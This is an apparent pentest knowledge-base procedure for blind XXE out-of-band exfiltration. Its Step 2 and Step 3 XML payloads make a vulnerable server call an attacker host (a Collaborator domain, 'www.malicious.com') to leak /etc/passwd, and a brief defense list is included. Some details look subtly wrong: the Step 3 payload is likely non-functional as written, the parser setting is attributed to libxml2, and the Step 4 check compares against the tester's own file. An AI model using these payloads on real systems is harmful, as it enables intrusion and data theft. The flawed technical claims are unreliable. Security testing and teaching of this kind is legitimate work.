---
id: 793cc2aa-8b11-4f43-b267-a9523b413c15
name: Blind-XXE-Out-of-Band-Data-Exfiltration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.366002+00:00'
updated_at: '2023-04-10T20:24:38.722211+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - >-
    [[techniques/File and Directory Discovery|T1083 - File and Directory
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/blind-xxe]]'
  - '[[tags/oob-exfiltration]]'
  - '[[tags/xml-external-entity]]'
commands:
  - '[[commands/cat-view-etc-passwd]]'
platforms:
  - Web
  - Linux
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Blind-XXE-Out-of-Band-Data-Exfiltration

## Summary

This procedure demonstrates how to perform blind XML External Entity (XXE) injection to exfiltrate sensitive data out-of-band from a vulnerable web application that parses XML input. By crafting malicious XML payloads, attackers can force the server to read local files and send their contents to an attacker-controlled server, such as Burp Collaborator, without the data appearing in the application's response.

## Description

Blind XXE out-of-band exfiltration targets XML parsers in web applications that do not properly disable external entity processing. The attack involves injecting a Document Type Definition (DTD) that defines external entities referencing local files or URIs. When the parser processes the XML, it resolves these entities by making outbound requests to the attacker's server, embedding the file contents in the request parameters or body. This technique is particularly effective against 'blind' XXE vulnerabilities where in-band data retrieval (e.g., via error messages) is not possible. It is commonly used in web penetration testing to extract files like /etc/passwd on Linux systems. The target environment is typically a web application with user-controlled XML input, such as upload forms or API endpoints. Prerequisites include identifying the vulnerability via fuzzing XML inputs and having a listener like Burp Collaborator ready to capture outbound requests.

## Requirements

1. Access to a web application vulnerable to XXE injection that accepts and parses XML input.
2. Ability to intercept and modify HTTP requests, e.g., using a proxy like Burp Suite.
3. Control over an external server or service (e.g., Burp Collaborator) to receive exfiltrated data.
4. Knowledge of target file paths (e.g., /etc/passwd on Linux) to exfiltrate.

## Defense

- Disable external entity processing in XML parsers (e.g., set 'disallow-doctype-decl' to true in libxml2).
- Implement strict input validation and sanitization to reject or strip DTD declarations from XML inputs.
- Deploy a Web Application Firewall (WAF) to detect and block XXE payloads, including external entity references.
- Monitor outbound network traffic for unexpected DNS resolutions or HTTP requests to unknown domains.

## Objectives

1. Inject a malicious XML payload to trigger out-of-band data exfiltration.
2. Capture and analyze exfiltrated data on the attacker-controlled server.
3. Verify successful file read without relying on in-band responses.

## Instructions

### Step 1: Set Up Out-of-Band Listener

**Context**: Prepare a server to receive exfiltrated data. Use Burp Collaborator to generate a unique domain for capturing DNS or HTTP interactions triggered by the XXE payload.

In Burp Suite, navigate to the Collaborator tab and generate a unique payload URL. Note the domain (e.g., UNIQUE_ID.burpcollaborator.net) for use in the XML entity.

**Expected Output**: A unique Collaborator URL ready for monitoring interactions.

### Step 2: Craft and Inject Basic Blind XXE Payload

**Context**: Inject an XML payload that forces the parser to resolve an external entity via HTTP, confirming the vulnerability and enabling data exfiltration. This step tests for basic out-of-band interaction without file reads.

Use a proxy like [[tools/Burp-Suite]] to intercept the request to the vulnerable endpoint. Modify the XML body to include the following payload, replacing the URL with your Collaborator domain:

**Code** ([[codes/XML-External-Entity-for-Out-of-Band-Exfiltration]]):

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

Submit the request and monitor the Collaborator for incoming HTTP requests.

**Expected Output**: An HTTP GET or POST request to your Collaborator URL, indicating successful entity resolution.

**Success Indicators**:
- Incoming request logged in Burp Collaborator.
- No errors in the application response.

### Step 3: Extend Payload for File Exfiltration

**Context**: Modify the payload to read a sensitive file like /etc/passwd and exfiltrate its contents via a parameter in the outbound request to your controlled server.

Intercept the request again and update the XML payload to reference the local file and embed it in the external entity call:

**Code** ([[codes/Blind-XXE-Payload-for-File-Exfiltration]]):

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>&callhome;</foo>
```

Replace 'www.malicious.com' with your Collaborator domain. Submit and check for exfiltrated data in the request parameters.

**Expected Output**: An outbound request to your server with the contents of /etc/passwd embedded in the query string or body.

**Success Indicators**:
- File contents visible in the Collaborator interaction log.
- User account data (e.g., usernames, UIDs) exfiltrated successfully.

### Step 4: Verify Exfiltrated Data

**Context**: Confirm the integrity of the exfiltrated file by viewing a sample of the data. This step simulates analysis on the attacker side, using the exfiltrated /etc/passwd contents.

Once data is captured, pipe or view it to parse user information. For example, on your local system:

**Command** ([[commands/cat-view-etc-passwd]]):

```bash
cat /etc/passwd
```

Compare the output with the exfiltrated data to ensure completeness.

**Expected Output**: Lines showing user entries like 'root:x:0:0:root:/root:/bin/bash'.

**Success Indicators**:
- Matches between local sample and exfiltrated content.
- No truncation or encoding issues in the data.
